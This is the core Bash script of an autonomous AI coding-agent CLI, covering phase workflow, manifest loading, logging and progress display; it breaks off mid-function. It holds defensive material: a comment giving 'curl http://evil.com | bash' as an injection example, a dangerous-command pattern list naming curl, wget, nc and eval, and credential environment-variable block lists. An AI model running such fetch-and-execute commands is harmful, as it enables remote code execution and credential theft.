#!/usr/bin/env bash
#
# AI Agent - Core Logic
#
# This is the core agent implementation for the doyaken CLI.
# It executes tasks through an 8-phase workflow with self-healing capabilities.
#
# PHASES:
#   0. EXPAND    - Expand brief prompt into full task specification (2min)
#   1. TRIAGE    - Validate task, check dependencies (2min)
#   2. PLAN      - Gap analysis, detailed planning (5min)
#   3. IMPLEMENT - Execute the plan, write code (30min)
#   4. TEST      - Run tests, add coverage (10min)
#   5. DOCS      - Sync documentation (5min)
#   6. REVIEW    - Code review, create follow-ups (10min)
#   7. VERIFY    - Verify task management, commit task files (3min)
#
# FEATURES:
#   - Modular phase-based execution (fresh context per phase)
#   - Phase-specific prompts and timeouts
#   - Verification gates with retry loops (IMPLEMENT, TEST, REVIEW)
#   - Model fallback (opus -> sonnet on rate limits)
#   - Self-healing and crash recovery
#   - Single-shot execution: dk run "prompt"
#
set -euo pipefail

# Secure file permissions: owner only (prevents world-readable logs/state)
umask 0077

# ============================================================================
# Path Configuration (supports global installation)
# ============================================================================

# Global installation directory
DOYAKEN_HOME="${DOYAKEN_HOME:-$HOME/.doyaken}"

# Fallback to script location for development
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [ ! -d "$DOYAKEN_HOME/prompts" ]; then
  DOYAKEN_HOME="$(cd "$SCRIPT_DIR/.." && pwd)"
fi

# Source agent abstraction
source "$SCRIPT_DIR/agents.sh"

# Source skills for hooks
source "$SCRIPT_DIR/skills.sh"

# Source configuration library
source "$SCRIPT_DIR/config.sh"

# Source approval system
source "$SCRIPT_DIR/approval.sh"

# Source progress display
source "$SCRIPT_DIR/progress.sh"

# Source circuit breaker
source "$SCRIPT_DIR/circuit_breaker.sh"

# Source rate limiter
source "$SCRIPT_DIR/rate_limiter.sh"

# Source exit detection
source "$SCRIPT_DIR/exit_detection.sh"

# Project directory (set by CLI or auto-detected)
PROJECT_DIR="${DOYAKEN_PROJECT:-$(pwd)}"

# Detect project data directory (.doyaken/ or .claude/ for legacy)
if [ -n "${DOYAKEN_DIR:-}" ]; then
  # Explicitly set (e.g., by CLI for legacy support)
  DATA_DIR="$DOYAKEN_DIR"
elif [ -d "$PROJECT_DIR/.doyaken" ]; then
  DATA_DIR="$PROJECT_DIR/.doyaken"
elif [ -d "$PROJECT_DIR/.claude" ]; then
  # Legacy support
  DATA_DIR="$PROJECT_DIR/.claude"
else
  echo "Error: No .doyaken/ or .claude/ directory found in $PROJECT_DIR"
  echo "Run 'doyaken init' to initialize this directory"
  exit 1
fi

# Prompts: Check project first, then global (project is source of truth)
# This allows projects to customize phase prompts
get_prompt_file() {
  local prompt_name="$1"

  # Check project-specific prompts first
  if [ -f "$DATA_DIR/prompts/$prompt_name" ]; then
    echo "$DATA_DIR/prompts/$prompt_name"
    return 0
  fi

  # Fall back to global prompts
  if [ -f "$DOYAKEN_HOME/prompts/$prompt_name" ]; then
    echo "$DOYAKEN_HOME/prompts/$prompt_name"
    return 0
  fi

  # Legacy fallback
  if [ -f "$DOYAKEN_HOME/agent/prompts/$prompt_name" ]; then
    echo "$DOYAKEN_HOME/agent/prompts/$prompt_name"
    return 0
  fi

  return 1
}

# For backward compatibility, set PROMPTS_DIR to global location
PROMPTS_DIR="${PROMPTS_DIR:-$DOYAKEN_HOME/prompts}"
if [ ! -d "$PROMPTS_DIR" ]; then
  PROMPTS_DIR="$DOYAKEN_HOME/agent/prompts"
fi

# Process {{include:path}} directives in prompts
# Allows modules to be referenced and composed into phase prompts
process_includes() {
  local content="$1"
  local max_depth="${2:-5}"  # Prevent infinite recursion

  if [ "$max_depth" -le 0 ]; then
    echo "$content"
    return 0
  fi

  # Find all {{include:path}} patterns
  local result="$content"
  local include_pattern='\{\{include:([^}]+)\}\}'

  while [[ "$result" =~ $include_pattern ]]; do
    local full_match="${BASH_REMATCH[0]}"
    local include_path="${BASH_REMATCH[1]}"

    # Find the include file (project first, then global)
    local include_file=""
    if [ -f "$DATA_DIR/prompts/$include_path" ]; then
      include_file="$DATA_DIR/prompts/$include_path"
    elif [ -f "$DOYAKEN_HOME/prompts/$include_path" ]; then
      include_file="$DOYAKEN_HOME/prompts/$include_path"
    fi

    if [ -n "$include_file" ] && [ -f "$include_file" ]; then
      # Read include content and process nested includes
      local include_content
      include_content=$(cat "$include_file")
      include_content=$(process_includes "$include_content" $((max_depth - 1)))

      # Replace the include directive with content
      result="${result//$full_match/$include_content}"
    else
      # Leave the directive if file not found (will show as error in prompt)
      log_warn "Include file not found: $include_path"
      break
    fi
  done

  echo "$result"
}

SCRIPTS_DIR="${SCRIPTS_DIR:-$DOYAKEN_HOME/lib}"

# ============================================================================
# Environment Variable Security (for manifest loading)
# ============================================================================

# Blocked environment variable prefixes (security-sensitive)
BLOCKED_ENV_PREFIXES=(
  "LD_"           # Library injection (Linux)
  "DYLD_"         # Library injection (macOS)
  "SSH_"          # SSH credentials
  "GPG_"          # GPG credentials
  "AWS_"          # AWS credentials
  "GOOGLE_"       # Google Cloud credentials
  "AZURE_"        # Azure credentials
  "LC_"           # Locale (can affect parsing)
)

# Blocked environment variables (exact match, security-sensitive)
BLOCKED_ENV_VARS=(
  # System paths
  "PATH" "MANPATH" "INFOPATH"
  # Library paths
  "LIBPATH" "SHLIB_PATH"
  # Interpreter paths
  "PYTHONPATH" "PYTHONHOME" "NODE_PATH" "NODE_OPTIONS"
  "RUBYLIB" "RUBYOPT" "PERL5LIB" "PERL5OPT"
  "CLASSPATH" "GOPATH" "GOROOT"
  # Shell injection
  "IFS" "PS1" "PS2" "PS4" "PROMPT_COMMAND" "BASH_ENV" "ENV" "CDPATH"
  # System identity
  "HOME" "USER" "SHELL" "TERM" "LOGNAME" "MAIL" "LANG"
  # Credential access
  "GNUPGHOME"
  # Network proxies
  "http_proxy" "https_proxy" "HTTP_PROXY" "HTTPS_PROXY"
  "no_proxy" "NO_PROXY" "ftp_proxy" "FTP_PROXY"
  # Other dangerous
  "EDITOR" "VISUAL" "PAGER" "BROWSER"
)

# Safe environment variable prefixes (allowlist)
SAFE_ENV_PREFIXES=(
  "DOYAKEN_"      # Our own variables
  "QUALITY_"      # Quality gate variables
  "CI_"           # CI/CD variables
  "DEBUG_"        # Debug flags
)

# ============================================================================
# Quality Command Security (for manifest loading)
# ============================================================================

# Safe command prefixes for quality gate commands (allowlist)
# Commands must start with one of these to be considered safe
SAFE_QUALITY_COMMANDS=(
  # Node.js ecosystem
  "npm" "yarn" "pnpm" "npx" "bun"
  # Rust
  "cargo"
  # Go
  "go"
  # Build tools
  "make"
  # Python testing/linting
  "pytest" "python" "ruff" "mypy" "black" "flake8" "pylint"
  # JavaScript/TypeScript linting
  "jest" "eslint" "tsc" "prettier" "vitest" "mocha"
  # Shell
  "shellcheck" "bats"
  # Other languages
  "node" "deno" "php" "composer" "ruby" "rake" "bundle"
  "gradle" "mvn" "dotnet"
)

# Dangerous patterns that indicate potential command injection
# These patterns in a quality command trigger a warning
DANGEROUS_COMMAND_PATTERNS=(
  '|'           # Pipe (command chaining)
  '$('          # Command substitution
  '`'           # Backtick command substitution
  '&&'          # Command chaining (AND)
  '||'          # Command chaining (OR) - can be legitimate for fallback
  ';'           # Command separator
  '>'           # Output redirection
  '>>'          # Append redirection
  '<'           # Input redirection
  'curl '       # Network access
  'wget '       # Network access
  'nc '         # Netcat
  'bash -c'     # Shell execution
  'sh -c'       # Shell execution
  'eval '       # Eval execution
  '/dev/'       # Device access
  '~/'          # Home directory access
  '../'         # Parent directory traversal
)

# Validate if an environment variable name is safe to export
# Returns 0 if safe, 1 if blocked
is_safe_env_var() {
  local var_name="$1"

  # Empty name is not safe
  [ -z "$var_name" ] && return 1

  # Convert to uppercase for comparison
  local var_upper
  var_upper=$(echo "$var_name" | tr '[:lower:]' '[:upper:]')

  # Check safe prefixes first (fast path for common cases)
  for prefix in "${SAFE_ENV_PREFIXES[@]}"; do
    if [[ "$var_upper" == "${prefix}"* ]]; then
      return 0
    fi
  done

  # Check blocked prefixes
  for prefix in "${BLOCKED_ENV_PREFIXES[@]}"; do
    if [[ "$var_upper" == "${prefix}"* ]]; then
      return 1
    fi
  done

  # Check blocked exact matches (case-insensitive for proxies)
  for blocked in "${BLOCKED_ENV_VARS[@]}"; do
    local blocked_upper
    blocked_upper=$(echo "$blocked" | tr '[:lower:]' '[:upper:]')
    if [ "$var_upper" = "$blocked_upper" ]; then
      return 1
    fi
  done

  # Validate pattern: must be uppercase alphanumeric with underscores
  # Must start with a letter
  if ! [[ "$var_name" =~ ^[A-Z][A-Z0-9_]*$ ]]; then
    return 1
  fi

  return 0
}

# Validate a quality gate command for safety
# Returns:
#   0 = safe (command is in allowlist, no dangerous patterns)
#   1 = suspicious (unknown command or has dangerous patterns) - warn only
#   2 = dangerous (blocked in strict mode) - block if DOYAKEN_STRICT_QUALITY=1
#
# Usage: validate_quality_command "npm test"
#        validate_quality_command "curl http://evil.com | bash"
validate_quality_command() {
  local cmd="$1"
  local cmd_name="${2:-quality command}"

  # Empty commands are safe (noop)
  [ -z "$cmd" ] && return 0

  # Trim leading/trailing whitespace
  cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
  [ -z "$cmd" ] && return 0

  # Extract the base command (first word, strip any path)
  local base_cmd
  base_cmd=$(echo "$cmd" | awk '{print $1}')
  base_cmd=$(basename "$base_cmd")

  # Check for dangerous patterns first (highest priority)
  local has_dangerous=0
  for pattern in "${DANGEROUS_COMMAND_PATTERNS[@]}"; do
    if [[ "$cmd" == *"$pattern"* ]]; then
      has_dangerous=1
      break
    fi
  done

  # Check if base command is in allowlist
  local is_allowed=0
  for safe_cmd in "${SAFE_QUALITY_COMMANDS[@]}"; do
    if [ "$base_cmd" = "$safe_cmd" ]; then
      is_allowed=1
      break
    fi
  done

  # Determine result based on checks
  if [ "$has_dangerous" -eq 1 ]; then
    # Dangerous pattern detected - return 2 (can be blocked in strict mode)
    return 2
  elif [ "$is_allowed" -eq 0 ]; then
    # Unknown command - return 1 (warn only)
    return 1
  fi

  # Safe command
  return 0
}

# ============================================================================
# First-Run Warning
# ============================================================================

# Check and display first-run warning about autonomous mode
# Skip if: CI=true, non-interactive terminal, or already acknowledged
check_first_run_warning() {
  local ack_file="$DOYAKEN_HOME/.acknowledged"

  # Skip in CI environments
  if [ "${CI:-false}" = "true" ]; then
    return 0
  fi

  # Skip in non-interactive terminals
  if ! [ -t 0 ]; then
    return 0
  fi

  # Skip if already acknowledged
  if [ -f "$ack_file" ]; then
    return 0
  fi

  # Display warning
  echo ""
  echo "╔════════════════════════════════════════════════════════════════════╗"
  echo "║                     ⚠  SECURITY NOTICE  ⚠                         ║"
  echo "╠════════════════════════════════════════════════════════════════════╣"
  echo "║  Doyaken runs AI agents in FULLY AUTONOMOUS MODE by default.      ║"
  echo "║                                                                    ║"
  echo "║  Agents can:                                                       ║"
  echo "║    • Execute arbitrary code without approval                       ║"
  echo "║    • Modify any files in your project                              ║"
  echo "║    • Access environment variables                                  ║"
  echo "║    • Make network requests                                         ║"
  echo "║                                                                    ║"
  echo "║  Use --safe-mode to disable bypass flags and require confirmation. ║"
  echo "║  See SECURITY.md for the full trust model.                         ║"
  echo "╚════════════════════════════════════════════════════════════════════╝"
  echo ""

  # Prompt for acknowledgment
  read -r -p "Type 'yes' to acknowledge and continue: " response

  if [ "$response" = "yes" ]; then
    # Create acknowledgment file
    mkdir -p "$(dirname "$ack_file")"
    echo "acknowledged=$(date -Iseconds 2>/dev/null || date)" > "$ack_file"
    echo ""
    echo "Acknowledgment recorded. This warning will not appear again."
    echo ""
    return 0
  else
    echo ""
    echo "Autonomous mode not acknowledged. Exiting."
    echo "Run with --safe-mode for interactive confirmation, or type 'yes' to continue."
    exit 1
  fi
}

# ============================================================================
# Manifest Loading
# ============================================================================

MANIFEST_FILE="$DATA_DIR/manifest.yaml"

# Global cache for manifest JSON (set by _load_manifest_json)
MANIFEST_JSON=""

# Load manifest as JSON for efficient parsing (single yq call)
# Sets MANIFEST_JSON global variable
_load_manifest_json() {
  if [ -n "$MANIFEST_JSON" ]; then
    return 0  # Already cached
  fi
  MANIFEST_JSON=$(yq -o=json '.' "$MANIFEST_FILE" 2>/dev/null) || MANIFEST_JSON="{}"
}

# Get value from cached manifest JSON
# Usage: _jq_get '.agent.name' -> returns value or empty string
_jq_get() {
  echo "$MANIFEST_JSON" | jq -r "$1 // \"\"" 2>/dev/null || echo ""
}

# Load manifest settings (if yq is available)
load_manifest() {
  if [ ! -f "$MANIFEST_FILE" ]; then
    return 0
  fi

  if ! command -v yq &>/dev/null; then
    echo -e "${YELLOW}[WARN]${NC} yq not installed - manifest.yaml settings will be ignored"
    echo -e "${YELLOW}[WARN]${NC} Install: brew install yq (macOS) or apt install yq (Linux)"
    return 0
  fi

  # Check if jq is available for optimized loading
  local use_json_cache=0
  if command -v jq &>/dev/null; then
    use_json_cache=1
    _load_manifest_json
  fi

  # Load agent settings from manifest (only if not set via CLI/env)
  local manifest_agent manifest_model
  if [ "$use_json_cache" = "1" ]; then
    manifest_agent=$(_jq_get '.agent.name')
    manifest_model=$(_jq_get '.agent.model')
  else
    manifest_agent=$(yq -e '.agent.name // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
    manifest_model=$(yq -e '.agent.model // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
  fi

  # Only apply manifest values if not already set by CLI
  if [ -z "${DOYAKEN_AGENT_FROM_CLI:-}" ] && [ -n "$manifest_agent" ]; then
    export DOYAKEN_AGENT="$manifest_agent"
  fi
  if [ -z "${DOYAKEN_MODEL_FROM_CLI:-}" ] && [ -n "$manifest_model" ]; then
    export DOYAKEN_MODEL="$manifest_model"
  fi

  # Load max retries
  local manifest_retries
  if [ "$use_json_cache" = "1" ]; then
    manifest_retries=$(_jq_get '.agent.max_retries')
  else
    manifest_retries=$(yq -e '.agent.max_retries // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
  fi
  if [ -n "$manifest_retries" ] && [ -z "${AGENT_MAX_RETRIES_FROM_CLI:-}" ]; then
    export AGENT_MAX_RETRIES="$manifest_retries"
  fi

  # Load quality gate commands (with security validation)
  local test_cmd lint_cmd format_cmd build_cmd
  if [ "$use_json_cache" = "1" ]; then
    test_cmd=$(_jq_get '.quality.test_command')
    lint_cmd=$(_jq_get '.quality.lint_command')
    format_cmd=$(_jq_get '.quality.format_command')
    build_cmd=$(_jq_get '.quality.build_command')
  else
    test_cmd=$(yq -e '.quality.test_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
    lint_cmd=$(yq -e '.quality.lint_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
    format_cmd=$(yq -e '.quality.format_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
    build_cmd=$(yq -e '.quality.build_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
  fi

  # Validate each quality command
  local validation_result
  local quality_cmds=("test_command:$test_cmd" "lint_command:$lint_cmd" "format_command:$format_cmd" "build_command:$build_cmd")
  for cmd_entry in "${quality_cmds[@]}"; do
    local cmd_name="${cmd_entry%%:*}"
    local cmd_value="${cmd_entry#*:}"
    [ -z "$cmd_value" ] && continue

    validation_result=0
    validate_quality_command "$cmd_value" "$cmd_name" || validation_result=$?

    case $validation_result in
      1)
        # Unknown command - warn only
        log_warn "Suspicious quality.$cmd_name: '$cmd_value' (unknown command prefix)"
        ;;
      2)
        # Dangerous pattern detected
        log_warn "Dangerous quality.$cmd_name: '$cmd_value' (contains dangerous pattern)"
        if [ "${DOYAKEN_STRICT_QUALITY:-0}" = "1" ]; then
          log_warn "Blocking quality.$cmd_name due to DOYAKEN_STRICT_QUALITY=1"
          # Clear the dangerous command
          case "$cmd_name" in
            test_command) test_cmd="" ;;
            lint_command) lint_cmd="" ;;
            format_command) format_cmd="" ;;
            build_command) build_cmd="" ;;
          esac
        fi
        ;;
    esac
  done

  export QUALITY_TEST_CMD="$test_cmd"
  export QUALITY_LINT_CMD="$lint_cmd"
  export QUALITY_FORMAT_CMD="$format_cmd"
  export QUALITY_BUILD_CMD="$build_cmd"

  # Load custom environment variables from manifest (with security validation)
  if [ "$use_json_cache" = "1" ]; then
    # Optimized: extract all env vars as key=value pairs in single jq call
    local env_pairs
    env_pairs=$(echo "$MANIFEST_JSON" | jq -r '.env // {} | to_entries[] | "\(.key)=\(.value)"' 2>/dev/null) || env_pairs=""
    while IFS='=' read -r key value; do
      [ -z "$key" ] && continue
      # Validate env var name before exporting
      if ! is_safe_env_var "$key"; then
        log_warn "Blocked unsafe env var from manifest: $key"
        continue
      fi
      if [ -n "$value" ]; then
        export "$key=$value"
      fi
    done <<< "$env_pairs"
  else
    local env_keys
    env_keys=$(yq -e '.env | keys | .[]' "$MANIFEST_FILE" 2>/dev/null || echo "")
    if [ -n "$env_keys" ]; then
      while IFS= read -r key; do
        [ -z "$key" ] && continue
        # Validate env var name before exporting
        if ! is_safe_env_var "$key"; then
          log_warn "Blocked unsafe env var from manifest: $key"
          continue
        fi
        local value
        value=$(yq -e ".env.${key}" "$MANIFEST_FILE" 2>/dev/null || echo "")
        if [ -n "$value" ]; then
          export "$key=$value"
        fi
      done <<< "$env_keys"
    fi
  fi

  # Load skill hooks for all phases
  local phases="expand triage plan implement test docs review verify"
  local hook_types="before after"
  if [ "$use_json_cache" = "1" ]; then
    # Optimized: extract all hooks in single jq call, iterate in bash
    local hooks_json
    hooks_json=$(echo "$MANIFEST_JSON" | jq -c '.skills.hooks // {}' 2>/dev/null) || hooks_json="{}"
    for phase in $phases; do
      for hook_type in $hook_types; do
        local hook_type_upper phase_upper
        hook_type_upper=$(echo "$hook_type" | tr '[:lower:]' '[:upper:]')
        phase_upper=$(echo "$phase" | tr '[:lower:]' '[:upper:]')
        local var_name="HOOKS_${hook_type_upper}_${phase_upper}"
        local hook_key="${hook_type}-${phase}"
        local hook_value
        hook_value=$(echo "$hooks_json" | jq -r ".\"$hook_key\" // [] | .[]" 2>/dev/null | tr '\n' ' ') || hook_value=""
        export "$var_name=$hook_value"
      done
    done
  else
    for phase in $phases; do
      for hook_type in $hook_types; do
        local hook_type_upper phase_upper
        hook_type_upper=$(echo "$hook_type" | tr '[:lower:]' '[:upper:]')
        phase_upper=$(echo "$phase" | tr '[:lower:]' '[:upper:]')
        local var_name="HOOKS_${hook_type_upper}_${phase_upper}"
        local hook_value
        hook_value=$(yq -e ".skills.hooks.${hook_type}-${phase} // [] | .[]" "$MANIFEST_FILE" 2>/dev/null | tr '\n' ' ' || echo "")
        export "$var_name=$hook_value"
      done
    done
  fi

  # Clear the cache after loading to avoid stale data on next call
  MANIFEST_JSON=""
}

# Run skill hooks for a phase
run_skill_hooks() {
  local hook_type="$1"  # "before" or "after"
  local phase_name="$2" # "EXPAND", "TRIAGE", etc.

  local phase_lower
  phase_lower=$(echo "$phase_name" | tr '[:upper:]' '[:lower:]')
  local hook_type_upper
  hook_type_upper=$(echo "$hook_type" | tr '[:lower:]' '[:upper:]')
  local hooks_var="HOOKS_${hook_type_upper}_${phase_name}"
  # Use indirect expansion instead of eval for safety
  local hooks="${!hooks_var:-}"

  [ -z "$hooks" ] && return 0

  log_info "Running $hook_type-$phase_lower hooks..."
  for skill_name in $hooks; do
    [ -z "$skill_name" ] && continue
    log_info "  Running skill: $skill_name"
    if ! run_skill "$skill_name" 2>&1 | head -20; then
      log_warn "  Skill $skill_name failed (continuing anyway)"
    fi
  done
}

# Load manifest early
load_manifest

# Load all configuration from global and project config files
# This handles: timeouts, skip_phases, agent settings, output settings
load_all_config "$MANIFEST_FILE"

# Load display/progress configuration
if declare -f load_display_config &>/dev/null; then
  load_display_config "$MANIFEST_FILE"
fi

# Load circuit breaker configuration
if declare -f load_circuit_breaker_config &>/dev/null; then
  load_circuit_breaker_config "$MANIFEST_FILE"
fi

# Load rate limiter configuration
if declare -f load_rate_limiter_config &>/dev/null; then
  load_rate_limiter_config "$MANIFEST_FILE"
fi

# Project-specific directories
LOGS_DIR="${LOGS_DIR:-$DATA_DIR/logs/claude-loop}"
STATE_DIR="${STATE_DIR:-$DATA_DIR/state}"

# Detect operating manual (AGENT.md or CLAUDE.md for legacy)
if [ -f "$PROJECT_DIR/AGENT.md" ]; then
  AGENT_MD="$PROJECT_DIR/AGENT.md"
elif [ -f "$PROJECT_DIR/CLAUDE.md" ]; then
  AGENT_MD="$PROJECT_DIR/CLAUDE.md"
else
  AGENT_MD=""
fi

# ============================================================================
# Configuration Defaults
# ============================================================================

# Agent configuration
DOYAKEN_AGENT="${DOYAKEN_AGENT:-claude}"
DOYAKEN_MODEL="${DOYAKEN_MODEL:-$(agent_default_model "$DOYAKEN_AGENT")}"

# Legacy support: CLAUDE_MODEL overrides DOYAKEN_MODEL for claude agent
if [ "$DOYAKEN_AGENT" = "claude" ] && [ -n "${CLAUDE_MODEL:-}" ]; then
  DOYAKEN_MODEL="$CLAUDE_MODEL"
fi

AGENT_DRY_RUN="${AGENT_DRY_RUN:-0}"
AGENT_VERBOSE="${AGENT_VERBOSE:-0}"
AGENT_QUIET="${AGENT_QUIET:-0}"
AGENT_PROGRESS="${AGENT_PROGRESS:-1}"
AGENT_MAX_RETRIES="${AGENT_MAX_RETRIES:-2}"
AGENT_RETRY_DELAY="${AGENT_RETRY_DELAY:-5}"
AGENT_NO_RESUME="${AGENT_NO_RESUME:-0}"
PHASE_MONITOR_INTERVAL="${PHASE_MONITOR_INTERVAL:-30}"
PHASE_STALL_THRESHOLD="${PHASE_STALL_THRESHOLD:-180}"
AGENT_NO_FALLBACK="${AGENT_NO_FALLBACK:-0}"

# Phase skip flags and timeouts are loaded from config files via load_all_config()
# They can still be overridden via environment variables
# See: config/global.yaml and .doyaken/manifest.yaml for configuration

# Ensure defaults if not loaded from config (fallback for edge cases)
SKIP_EXPAND="${SKIP_EXPAND:-0}"
SKIP_TRIAGE="${SKIP_TRIAGE:-0}"
SKIP_PLAN="${SKIP_PLAN:-0}"
SKIP_IMPLEMENT="${SKIP_IMPLEMENT:-0}"
SKIP_TEST="${SKIP_TEST:-0}"
SKIP_DOCS="${SKIP_DOCS:-0}"
SKIP_REVIEW="${SKIP_REVIEW:-0}"
SKIP_VERIFY="${SKIP_VERIFY:-0}"

TIMEOUT_EXPAND="${TIMEOUT_EXPAND:-900}"
TIMEOUT_TRIAGE="${TIMEOUT_TRIAGE:-540}"
TIMEOUT_PLAN="${TIMEOUT_PLAN:-900}"
TIMEOUT_IMPLEMENT="${TIMEOUT_IMPLEMENT:-7200}"
TIMEOUT_TEST="${TIMEOUT_TEST:-3600}"
TIMEOUT_DOCS="${TIMEOUT_DOCS:-900}"
TIMEOUT_REVIEW="${TIMEOUT_REVIEW:-1800}"
TIMEOUT_VERIFY="${TIMEOUT_VERIFY:-1800}"

# Phase definitions: name|prompt_file|timeout|skip_var
PHASES=(
  "EXPAND|phases/0-expand.md|$TIMEOUT_EXPAND|$SKIP_EXPAND"
  "TRIAGE|phases/1-triage.md|$TIMEOUT_TRIAGE|$SKIP_TRIAGE"
  "PLAN|phases/2-plan.md|$TIMEOUT_PLAN|$SKIP_PLAN"
  "IMPLEMENT|phases/3-implement.md|$TIMEOUT_IMPLEMENT|$SKIP_IMPLEMENT"
  "TEST|phases/4-test.md|$TIMEOUT_TEST|$SKIP_TEST"
  "DOCS|phases/5-docs.md|$TIMEOUT_DOCS|$SKIP_DOCS"
  "REVIEW|phases/6-review.md|$TIMEOUT_REVIEW|$SKIP_REVIEW"
  "VERIFY|phases/7-verify.md|$TIMEOUT_VERIFY|$SKIP_VERIFY"
)

# Model state (for fallback)
CURRENT_AGENT="$DOYAKEN_AGENT"
CURRENT_MODEL="$DOYAKEN_MODEL"
MODEL_FALLBACK_TRIGGERED=0

# Pass-through arguments for the underlying agent CLI
# Set via DOYAKEN_PASSTHROUGH_ARGS environment variable (space-separated)
# or via -- separator on command line
if [ -n "${DOYAKEN_PASSTHROUGH_ARGS:-}" ]; then
  # Convert space-separated string to array
  read -r -a DOYAKEN_PASSTHROUGH_ARGS <<< "$DOYAKEN_PASSTHROUGH_ARGS"
else
  DOYAKEN_PASSTHROUGH_ARGS=()
fi

# Agent identification
AGENT_NAME="${AGENT_NAME:-doyaken}"
AGENT_ID="${AGENT_NAME}"

# Track if this is an interrupt (Ctrl+C) vs normal exit
INTERRUPTED=0

# Source centralized logging for colors
source "$SCRIPT_DIR/logging.sh"

# Additional color for core
MAGENTA='\033[0;35m'

# ============================================================================
# Logging (agent-specific with AGENT_ID prefix)
# ============================================================================

RUN_TIMESTAMP=$(date '+%Y%m%d-%H%M%S')
RUN_LOG_DIR="$LOGS_DIR/$RUN_TIMESTAMP-$AGENT_ID"

# Core uses AGENT_ID in prefix for multi-agent distinction
log_info() {
  echo -e "${BLUE}[$AGENT_ID]${NC} $1"
}

log_success() {
  echo -e "${GREEN}[$AGENT_ID OK]${NC} $1"
}

log_warn() {
  echo -e "${YELLOW}[$AGENT_ID WARN]${NC} $1"
}

log_error() {
  echo -e "${RED}[$AGENT_ID ERROR]${NC} $1"
}

log_step() {
  echo -e "${CYAN}[$AGENT_ID STEP]${NC} $1"
}

log_heal() {
  echo -e "${MAGENTA}[$AGENT_ID HEAL]${NC} $1"
}

log_monitor() {
  echo -e "${DIM}[$AGENT_ID MONITOR]${NC} $1"
}

log_monitor_warn() {
  echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC} $1"
}

log_model() {
  echo -e "${MAGENTA}[$AGENT_ID MODEL]${NC} $1"
}

log_phase() {
  echo -e "${BOLD}${CYAN}[$AGENT_ID PHASE]${NC} $1"
}

log_header() {
  echo ""
  echo -e "${BOLD}════════════════════════════════════════════════════════════${NC}"
  echo -e "${BOLD} $1${NC}"
  echo -e "${BOLD} Agent: $AGENT_ID${NC}"
  echo -e "${BOLD}════════════════════════════════════════════════════════════${NC}"
}

# ============================================================================
# Progress Filter (for AGENT_PROGRESS mode)
# ============================================================================

progress_filter() {
  trap "exit 130" INT TERM
  local phase_name="$1"
  local last_tool=""
  local line_count=0
  local start_time
  start_time=$(date +%s)

  show_status() {
    local elapsed=$(( $(date +%s) - start_time ))
    local mins=$(( elapsed / 60 ))
    local secs=$(( elapsed % 60 ))
    printf "${CYAN}[%s]${NC} ${BOLD}%s${NC} %02d:%02d │ %s\n" "$AGENT_ID" "$phase_name" "$mins" "$secs" "$1"
  }

  while IFS= read -r line; do
    ((++line_count))

    # Show "connected" on very first line received from agent
    if [ "$line_count" -eq 1 ]; then
      show_status "⋯ connected, processing..."
    fi

    if command -v jq &>/dev/null; then
      local msg_type
      msg_type=$(echo "$line" | jq -r '.type // empty' 2>/dev/null)

      case "$msg_type" in
        "assistant")
          # Extract tool calls with context (file name, pattern, command desc)
          local tool_detail
          tool_detail=$(echo "$line" | jq -r '
            [.message.content[] | select(.type == "tool_use") |
              .name + (
                if .name == "Read" or .name == "Edit" or .name == "Write" then
                  " " + (.input.file_path // "" | split("/") | last)
                elif .name == "Glob" then " " + (.input.pattern // "")
                elif .name == "Grep" then " \"" + ((.input.pattern // "")[:40]) + "\""
                elif .name == "Bash" then " " + ((.input.description // .input.command // "")[:50])
                elif .name == "Task" then " " + ((.input.description // "")[:40])
                else ""
                end
              )
            ] | join("  →  ")' 2>/dev/null)
          if [ -n "$tool_detail" ]; then
            show_status "🔧 $tool_detail"
            last_tool="$tool_detail"
          else
            # No tools - show text content (thinking)
            local content
            content=$(echo "$line" | jq -r '
              [.message.content[] | select(.type == "text") | .text] |
              join("") | gsub("\n"; " ") | .[:120]' 2>/dev/null)
            if [ -n "$content" ]; then
              show_status "💭 ${content}"
            fi
          fi
          ;;
        "user")
          # Tool results - show brief stdout summary
          local tool_stdout
          tool_stdout=$(echo "$line" | jq -r '
            if .tool_use_result.stdout then
              .tool_use_result.stdout | gsub("\n"; " ") | .[:80]
            else empty end' 2>/dev/null)
          if [ -n "$tool_stdout" ]; then
            show_status "📎 ${tool_stdout}"
          fi
          ;;
        "result")
          local subtype cost_usd duration_ms num_turns
          subtype=$(echo "$line" | jq -r '.subtype // empty' 2>/dev/null)
          cost_usd=$(echo "$line" | jq -r '.cost_usd // empty' 2>/dev/null)
          duration_ms=$(echo "$line" | jq -r '.duration_ms // empty' 2>/dev/null)
          num_turns=$(echo "$line" | jq -r '.num_turns // empty' 2>/dev/null)
          if [ "$subtype" = "success" ]; then
            local duration_s=""
            [ -n "$duration_ms" ] && duration_s="$(( duration_ms / 1000 ))s"
            show_status "✅ Done (${num_turns:-?} turns, ${duration_s:-?}, \$${cost_usd:-?})"
          else
            show_status "❌ Failed: $subtype (\$${cost_usd:-?})"
          fi
          ;;
        "system")
          local model
          model=$(echo "$line" | jq -r '.model // empty' 2>/dev/null)
          show_status "⋯ session started${model:+ ($model)}"
          ;;
        *)
          if [ $((line_count % 10)) -eq 0 ]; then
            show_status "⋯ working"
          fi
          ;;
      esac
    else
      # Fallback without jq
      if echo "$line" | grep -q '"tool_use"'; then
        local tool
        tool=$(echo "$line" | grep -oE '"name":"[^"]+"' | head -1 | cut -d'"' -f4)
        if [ -n "$tool" ] && [ "$tool" != "$last_tool" ]; then
          last_tool="$tool"
          show_status "🔧 $tool"
        fi
      elif echo "$line" | grep -q '"type":"result"'; then
        show_status "✅ Done"
      elif [ $((line_count % 5)) -eq 0 ]; then
        show_status "⋯ working"
      fi
    fi
  done
}


# ============================================================================
# Phase Monitor (Active Health Checking)
# ============================================================================
# Monitors agent output during phase execution to detect stuck/hung agents.
# Checks log file growth at regular intervals and warns when no output is
# produced for too long.

PHASE_MONITOR_PID=""

start_phase_monitor() {
  local phase_name="$1"
  local phase_log="$2"
  local timeout="$3"

  stop_phase_monitor

  (
    trap "exit 0" INT TERM
    local last_size=0
